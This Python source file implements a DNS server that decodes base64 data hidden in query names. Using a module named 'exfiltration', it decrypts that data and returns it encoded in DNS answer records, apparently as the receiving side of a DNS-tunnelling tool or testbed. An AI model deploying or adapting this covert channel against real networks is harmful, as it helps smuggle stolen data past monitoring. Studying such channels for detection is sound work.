#!/usr/bin/env python3
# coding: utf-8

import sys
import time 
import base64
import random
import select
import socket
import struct
import hashlib
import argparse
import textwrap

import dnslib as dns
import exfiltration as exf
from datetime import datetime
from copy import deepcopy

DEBUG = None

def print_with_time(head, message):
        curr_time = datetime.now().strftime("%H:%M:%S.%f")
        print(f"[{head}] [{curr_time[:-3]}]", message)

class Server():
    def __init__(self, host, port, timeout):
        self.addr = (host, port)
        self.hostname = socket.gethostname()
        self.timeout = timeout
        self.sockets = []
        self.last = {}
        self.tcps = {}

        try:
            self.tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.tcp_sock.bind(self.addr)
            self.tcp_sock.setblocking(True)
            self.tcp_sock.listen()
        
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_sock.settimeout(self.timeout)
            udp_sock.bind(self.addr)

            self.sockets += [self.tcp_sock, udp_sock]

        except socket.error as error:
            print("[Socket] Initialization failed:", str(error))
            return None

    def load_config(self, filename):
        with open(filename, 'r') as file:
            text = file.read()
            self.zones = dns.RR.fromZone(textwrap.dedent(text))

    def run(self):
        print(f"[Info] Server is running!")
        while True:
            try:
                readable, writable, exceptional = select.select(self.sockets, [], self.sockets)
                now = time.time()
                for sock in readable:
                    if sock.type == socket.SOCK_DGRAM:
                        self.process_udp(sock)
                    
                    if sock.type == socket.SOCK_STREAM:
                        if sock == self.tcp_sock:
                            self.accept_tcp(sock)
                        else:
                            self.process_tcp(sock)

                closed = []
                for sock in self.last:
                    if sock not in self.last and now-self.last[sock] > self.timeout:
                        sock.close()
                        closed += [sock]

                for dead in closed:
                    del self.last[dead]

                for sock in exceptional:
                    self.sockets.remove(sock)
                    sock.close()

            except ConnectionResetError:
                continue
            except KeyboardInterrupt:
                print("[Interrupt] Exit by the user...")
                break
            except Exception as error:
                print("[Info]", str(error))
                break
            
        print("[Exit] Server is shutting down!")
        for sock in self.sockets:
            sock.close()
        return
 
    def process_udp(self, sock):
        request, addr = sock.recvfrom(exf.SOCK_BUFFER_SIZE)
        if request:
            print_with_time("UDP", f"Received {len(request)} bytes from {addr}")

            response = self.dns_resolve(request)
            sock.sendto(response, addr)
        else:
            return

    def accept_tcp(self, sock):
        c, addr = sock.accept()
        c.settimeout(self.timeout)

        print_with_time("TCP", f"{addr} connected")
        self.sockets += [c]
        self.tcps[c] = addr
        
    def process_tcp(self, sock):
        request = sock.recv(exf.SOCK_BUFFER_SIZE)
        if request:
            print_with_time("TCP", f"Receiving {len(request)} bytes from {self.tcps[sock]}")

            response = self.dns_resolve(request[2:])
            dns_len = struct.pack("!H", len(response))
            sock.send(dns_len + response)
        else:
            print_with_time("TCP", f"{self.tcps[sock]} disconnected")

            sock.close()
            self.sockets.remove(sock)
            del self.tcps[sock]

    def dns_resolve(self, query):
        request = dns.DNSRecord.parse(query)
        domain = request.q.get_qname()
        qtype =  request.q.qtype
        
        data = exf.domain_decode(str(domain), base64.urlsafe_b64decode)
        
        if (len(request.questions) > 1):
            enc_domain = str(request.questions[1].get_qname())
            enc_key = exf.domain_decode(enc_domain, base64.urlsafe_b64decode)
            enc_key = exf.scramble(enc_key, (4, 12), True)

            if len(enc_key) < 3:
                enc_key = tuple(enc_key) 
                data = exf.scramble(data, enc_key, True)
            else:
                enc_key = enc_key.decode()
                data = exf.aes_decrypt(data, enc_key)

        core_domain = deepcopy(domain)
        core_domain.label = domain.label[-2:]

        if (qtype == dns.QTYPE.A):
            data = exf.ip_encode(data, False)
        
        elif (qtype == dns.QTYPE.AAAA):
            data = exf.ip_encode(data, True)

        elif (qtype ==  dns.QTYPE.TXT):
            data = [dns.TXT(data)]
        
        else:
            data = exf.domain_encode(data, str(core_domain), base64.urlsafe_b64encode)
            if (qtype == dns.QTYPE.CNAME):
                data = [dns.CNAME(data)]
            elif (qtype ==  dns.QTYPE.MX):
                data = [dns.MX(data)]
            elif (qtype == dns.QTYPE.NS):
                data = [dns.NS(data)]

        reply = request.reply()
        for rd in data:
            reply.add_answer(dns.RR(str(domain), rtype=qtype, rdata=rd))
        
        print_with_time("DNS", f"Sending back the request in size {len(reply.pack())} bytes")
        return reply.pack()

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":  
    parser = argparse.ArgumentParser(description="DNS server script")
    
    parser.add_argument('-p', '--port', dest='port', type=int, default=53,
                        help='Specifies the port that the server will listen to')

    parser.add_argument('-d', '--debug', dest='debug', action="store_true",
                        help='Displays debugging information')

    parser.add_argument('-t', '--timeout', dest='timeout', type=int, default=10,
                        help='Specifies the timeout for incoming connections')

    args = parser.parse_args()
    DEBUG = args.debug

    server = Server('', args.port, args.timeout)
    server.run()
    sys.exit(0)